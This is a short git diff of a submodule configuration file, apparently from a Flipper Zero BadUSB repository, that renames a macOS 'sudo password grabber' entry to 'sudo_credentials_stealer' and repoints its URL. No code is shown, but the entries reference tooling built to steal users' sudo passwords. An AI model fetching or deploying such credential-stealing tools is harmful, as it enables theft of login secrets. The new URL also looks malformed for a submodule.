@@ -1,3 +1,3 @@
 [submodule "macOS/full_passwords_grabber/sudo_password_grabber"]
-	path = macOS/full_passwords_grabber/sudo_password_grabber
-	url = https://github.com/birkhoffcheng/sudo_password_grabber
+	path = macOS/full_passwords_grabber/sudo_credentials_stealer
+	url = https://github.com/grugnoymeme/flipperzero-badUSB/tree/main/macOS/sudo_credentials_stealer
